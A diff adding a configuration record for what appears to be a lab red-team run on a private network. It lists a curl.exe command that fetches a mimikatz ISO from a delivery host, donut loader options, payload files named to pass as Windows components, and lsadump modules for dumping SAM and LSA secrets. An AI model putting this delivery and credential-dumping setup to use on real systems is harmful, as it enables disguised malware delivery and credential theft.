@@ -1,0 +1,14 @@
+scenario=run-d
+delivery_bind=192.168.1.50:18080
+delivery_object=mimikatz-expansion.iso
+target=192.168.1.52
+allowed_network=192.168.1.0/24
+donut_options=-a 2 -b 1 -e 1 -z 1; argument field changed without changing executable code
+planted_images=CredentialManager.exe,RuntimeBroker.exe,version.dll,riched32.dat,mimikatz.exe
+injection_hosts=none
+target_delivery=curl.exe http://192.168.1.50:18080/mimikatz-expansion.iso
+target_execute=C:\ProgramData\Microsoft\NetTokenBroker\CredentialManager.exe
+embedded_modules=lsadump::sam,lsadump::secrets
+credential_output=success/error counts only; transient output deleted before evidence packaging
+network_behavior=none from embedded payload; no C2 configured
+delivery_result=GET 200
